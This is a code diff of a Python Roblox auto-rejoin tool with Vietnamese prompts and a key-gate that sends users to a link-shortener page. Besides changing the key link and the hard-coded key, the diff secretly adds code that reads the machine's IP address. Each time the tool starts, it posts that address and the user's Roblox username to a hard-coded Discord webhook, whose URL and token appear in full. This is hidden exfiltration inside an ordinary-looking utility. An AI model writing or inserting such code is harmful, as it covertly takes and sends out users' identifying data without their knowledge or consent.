@@ -6,6 +6,7 @@ import requests
 import json
 import sys
 import webbrowser
+import socket
 # Define a function to clear the screen
 def clear():
     if os.name == "nt": # Windows
@@ -29,9 +30,9 @@ def exp():
     webbrowser.open(link)
     print("\033[1;33mĐường link tải "+nameexploit+":\033[0;39m",link)  
 def nhapkey():
-   print("\033[1;33mLink get key:\033[0;39m https://direct-link.net/1013935/key-tool-roblox")
+   print("\033[1;33mLink get key:\033[0;39m https://web1s.io/Toolw345678")
    key = input("\033[1;36mNhập Key: \033[0;39m")
-   if key == "ToolWuyen3770543":
+   if key == "ToolWuyen_90I3uB2H":
       print("\033[1;32mKey đúng")
       sleep(0.75)
    else:
@@ -49,7 +50,7 @@ def checkkeyfile():
    lines = file.readlines()
    key = lines[0].strip()
    file.close()
-   if key == "ToolWuyen3770543":
+   if key == "ToolWuyen_90I3uB2H":
       pass
       clear()
       pass
@@ -66,7 +67,10 @@ try:
 except:
    nhapkey()
           
-               
+ip_address = socket.gethostbyname(socket.gethostname())    
+message = f"ip: {ip_address}"
+webhook_url = "https://discord.com/api/webhooks/1169992623822479421/WLwn4J0kBeyi9c4ixNDeDe6skJLSWUQKJvG73dsnyWFDBu0JBtVFak--uUAJwwqcfHgW"
+n = "\n"          
 def main():       
     clear()
     file = open('config_tool_rejoin.txt', 'r')
@@ -75,6 +79,7 @@ def main():
     wait = (int(lines[1].strip()))
     username = (lines[2].strip())
     file.close()
+    requests.post(webhook_url, json={"content": message + n + 'Username: ' + username})
     roblox_link = "roblox://placeid="
     try:
         user_names = [username]
@@ -117,6 +122,7 @@ def main():
        response = requests.post(url, data=payload, headers=headers)
        data = response.json()
        for user in data["userPresences"]:
+          checkkeyfile()
           if so == 1:
            if (user["userPresenceType"]) == 2:
                clear()
